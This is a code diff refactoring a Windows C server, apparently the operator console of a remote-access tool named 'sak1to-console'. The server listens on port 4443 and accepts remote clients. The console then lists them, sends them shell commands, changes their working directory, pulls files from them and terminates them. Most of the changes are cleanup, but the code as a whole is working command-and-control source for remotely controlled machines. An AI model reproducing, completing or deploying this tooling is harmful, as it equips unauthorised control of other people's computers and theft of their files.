@@ -22,6 +22,8 @@ typedef struct {
 } Conn;
 
 typedef struct {
+	// Socket for accepting connections.
+	SOCKET listen_socket;
 	// Array of Conn objects/structures.
 	Conn* clients;
 	// Memory blocks allocated.
@@ -35,7 +37,7 @@ typedef int (*func)(char*, size_t, SOCKET);
 
 
 // Function to close specified socket.
-void close_socket(SOCKET socket) {
+void close_server(SOCKET socket) {
 	closesocket(socket);
 	WSACleanup();
 }
@@ -60,7 +62,7 @@ SOCKET create_socket() {
 }
 
 // Function to bind socket to specified port.
-void bind_socket(SOCKET listen_socket, const int port) {
+void bind_socket(const SOCKET listen_socket, const int port) {
 	// Create hint structure.
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
@@ -71,7 +73,7 @@ void bind_socket(SOCKET listen_socket, const int port) {
 	// Bind ip address and port to listen_socket.
 	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
 		printf("Socket bind failed with error: %d\n", WSAGetLastError());
-		close_socket(listen_socket);
+		close_server(listen_socket);
 		exit(1);
 	}
 
@@ -87,16 +89,18 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 	conns->size = 0;
 	conns->clients = malloc(conns->alloc * sizeof(Conn));
 
-	while (1) {
-		SOCKET listen_socket = create_socket();
-		bind_socket(listen_socket, 4443);
+	conns->listen_socket = create_socket();
+	bind_socket(conns->listen_socket, 4443);
 
+	while (1) {
 		// Wait for a connection.
 		struct sockaddr_in client;
 		int clientSize = sizeof(client);
 
 		// Client socket object.
-		SOCKET client_socket = accept(listen_socket, (struct sockaddr*)&client, &clientSize);
+		SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &clientSize);
+		if (client_socket == INVALID_SOCKET)
+			printf("Error accepting client connection.");
 
 		// Client's remote name and client's ingress port.
 		char host[NI_MAXHOST] = { 0 };
@@ -117,9 +121,7 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
 			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
 		}
-		closesocket(listen_socket);
 	}
-	free(conns->clients);
 }
 
 // Function to read/store stdin until \n is detected.
@@ -251,7 +253,7 @@ int recv_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function send change directory command to client.
-int client_cd(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	buf[3] = '1';
 	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -260,7 +262,7 @@ int client_cd(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to terminate/kill client.
-int terminate_client(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	send(client_socket, "2", cmd_len, 0);
 
 	return 0;
@@ -283,7 +285,7 @@ func parse_cmd(char* const buf) {
 }
 
 // Function to send command to client.
-int send_cmd(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -353,7 +355,7 @@ void interact(Conn_array* conns, char* const buf, const int client_id) {
 		}
 	}
 
-	close_socket(client_socket);
+	closesocket(client_socket);
 	resize_conns(conns, client_id);
 	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
 }
@@ -380,14 +382,16 @@ void exec_cmd(char* const buf) {
 	_pclose(fpipe);
 }
 
-// Function for parsing console input.
-void sakito_console(Conn_array* conns) {
+// Main function for parsing console input and calling sakito-console functions.
+int main(void) {
+	Conn_array conns;
+	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
+
 	HANDLE  hColor;
 
 	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hColor, 9);
 
-	// Parse/execute sakito-console input.
 	while (1) {
 		printf("sak1to-console // ");
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
@@ -398,14 +402,17 @@ void sakito_console(Conn_array* conns) {
 
 		if (cmd_len > 1) {
 			if (compare(cmd, "exit")) {
+				// Quit accepting connections.
+				TerminateThread(acp_thread, 0);
 				// if there's any connections close them before exiting.
-				if (conns->size) {
-					for (size_t i = 0; i < conns->size; i++) {
-						close_socket(conns->clients[i].sock);
+				if (conns.size) {
+					for (size_t i = 0; i < conns.size; i++) {
+						closesocket(conns.clients[i].sock);
 					}
 					// Free allocated memory.
-					free(conns->clients);
+					free(conns.clients);
 				}
+				close_server(conns.listen_socket);
 				return;
 			}
 			else if (compare(cmd, "cd ")) {
@@ -414,17 +421,17 @@ void sakito_console(Conn_array* conns) {
 			}
 			else if (compare(cmd, "list")) {
 				// List all connections.
-				list_connections(conns);
+				list_connections(&conns);
 			}
 			else if (compare(cmd, "interact ")) {
 				// Interact with client.
 				int client_id;
 				client_id = atoi(&cmd[9]);
-				if (!conns->size || client_id < 0 || client_id > conns->size - 1) {
+				if (!conns.size || client_id < 0 || client_id > conns.size - 1) {
 					printf("Invalid client identifier.\n");
 				}
 				else {
-					interact(conns, buf, client_id);
+					interact(&conns, buf, client_id);
 				}
 			}
 			else {
@@ -433,14 +440,5 @@ void sakito_console(Conn_array* conns) {
 			}
 		}
 	}
-}
-
-// Main function.
-int main(void) {
-	Conn_array conns;
-	CreateThread(0, 0, accept_conns, &conns, 0, 0);
-
-	sakito_console(&conns);
-
-	return -1;
+	return 0;
 }
